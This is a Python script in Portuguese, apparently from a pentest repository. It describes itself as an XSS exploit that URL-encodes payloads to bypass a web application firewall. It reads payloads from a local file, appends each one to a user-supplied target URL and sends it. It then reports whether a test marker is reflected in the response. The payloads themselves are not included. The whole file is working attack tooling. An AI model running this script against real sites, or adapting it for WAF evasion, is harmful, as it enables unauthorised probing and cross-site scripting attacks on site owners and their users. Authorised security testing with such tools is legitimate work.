#!/usr/bin/python3

#############################################################################
#   Repositorio:    Pentest Scripts - CVEs                                   #
#   Nome:           Encode XSS Test                                         #
#   Descrição:      Exploit XSS                                             #
#   Autor:          Carine Constantino                                      #
#   Versão:         1.0                                                     #
#   Data:           04/01/2022                                              #                                      
#   Função:         Script para explorar a vulnerabilidade                  #  
#                   XSS - Cross-Site Script usando url-encode               #
#                   para by-pass de WAF.                                    #
#   									    #
#                                                                           #
#############################################################################

import re
import requests
from datetime import datetime
from pyfiglet import Figlet
import argparse

print('--------------------------------------------')
desenho  = Figlet(font='eftiwall')
banner_desenho = desenho.renderText('rtz')
fonte = Figlet(font='contessa')
banner_fonte = fonte.renderText('Encode-XSS-Test')

print(banner_desenho)
print(banner_fonte)
print('--------------------------------------------')
print('Create By: Carine Constantino\n') 
print('carine.constantino@hotmail.com')
print('--------------------------------------------')

class Scan:

    def __init__(self, target):
        
        self.url = target

if __name__ == '__main__':

    program_name  = argparse.ArgumentParser(description = 'Mini-XSS-Test')
    program_name.add_argument('--target', action='store', dest='target',
                                            required = True, help = ''' Informe uma URL para executar o attack-test :::
                                            Exemplo: python3 mini_xss_test.py --target https://example.com.br ''')
                                            
    program_name.add_argument('--attack-check', action='store', dest='check',
                                            required = False, help = ''' Validar se o payload foi executado :::
                                            Exemplo: python3 mini_xss_test.py --target https://example.com.br --attack-check 1 ''')                                        

    argumentos_parser = program_name.parse_args()
    target = argumentos_parser.target
    check = argumentos_parser.check

def attack():

    payload_list = 'payloads-xss'
    open_file = open(payload_list, "r")

    for linha in open_file.readlines():

        encode_payload = requests.utils.quote(linha)
        encode_target = target + encode_payload
        req = requests.get(encode_target)
        req_text = req.text
        search = re.findall('(teste-xss)', req_text)
        result_search = search
        
        if len(search) > 0:
            print('----------------------------\n')
            print('Payload Executed - XSS Attack Refleted -  Response:', req.status_code)
            print('Payload Send: ', encode_target)
            print('-----------------------------\n')
        else:
            print('----------------------------\n')
            print('Payload Not Executed - XSS Attack Refleted Not Possible - Response:',  req.status_code)
            print('Payload Send: ', encode_target)
            print('-----------------------------\n')

attack()

